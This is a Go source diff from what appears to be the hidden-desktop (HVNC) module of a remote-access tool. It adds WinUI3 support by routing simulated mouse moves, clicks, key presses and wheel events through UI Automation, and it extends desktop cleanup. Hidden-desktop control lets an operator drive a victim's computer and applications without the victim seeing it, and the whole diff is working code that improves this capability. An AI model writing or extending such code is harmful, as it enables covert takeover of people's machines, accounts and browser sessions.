@@ -405,6 +405,12 @@ func CleanupHVNCDesktop() {
 	}
 	hvncInitialized = false
 	hvncExplorerStarted = false
+
+	uiaCleanup()
+	uiaClearActiveElement()
+	resetWinUI3Cache()
+	resetInputSiteCache()
+
 	if hvncThreadTasks != nil {
 		close(hvncThreadTasks)
 		hvncThreadTasks = nil
@@ -1038,6 +1044,13 @@ func hvncMouseMoveOnThread(display int, x, y int32) error {
 			procSetActiveWindow.Call(root)
 			procSetFocus.Call(hitHwnd)
 		}
+
+		if isWinUI3Window(hitHwnd) {
+			uiaHandleDragMove(pt)
+			uiaHandleMouseMove(hitHwnd, pt)
+			return nil
+		}
+
 		clientPt := pt
 		procScreenToClient.Call(hitHwnd, uintptr(unsafe.Pointer(&clientPt)))
 		postMouseMessage(hitHwnd, WM_MOUSEMOVE, uintptr(currentMouseButtons()), clientPt)
@@ -1057,6 +1070,11 @@ func hvncMouseButtonOnThread(button int, down bool) error {
 	hitHwnd := windowFromPoint(pt)
 	if hitHwnd == 0 {
 		return nil
+	}
+
+	// WinUI3 branch: route through UIA patterns
+	if isWinUI3Window(hitHwnd) {
+		return uiaHandleMouseButton(hitHwnd, pt, button, down)
 	}
 
 	root := rootWindow(hitHwnd)
@@ -1175,6 +1193,13 @@ func hvncKeyOnThread(vk uint16, down bool) error {
 		procSetFocus.Call(hwnd)
 	}
 	updateModifierState(vk, down)
+
+	if isWinUI3Window(hwnd) {
+		if isModifierVK(vk) {
+			return nil
+		}
+		return uiaHandleKey(hwnd, vk, down)
+	}
 
 	if isModifierVK(vk) {
 		return nil
@@ -1441,6 +1466,11 @@ func hvncMouseWheelOnThread(delta int32) error {
 			return nil
 		}
 	}
+
+	if isWinUI3Window(hwnd) {
+		return uiaHandleMouseWheel(hwnd, pt, delta)
+	}
+
 	wparam := (uintptr(uint16(delta)) << 16) | uintptr(currentMouseButtons())
 	procPostMessageW.Call(hwnd, WM_MOUSEWHEEL, wparam, makeLParam(pt.x, pt.y))
 	return nil
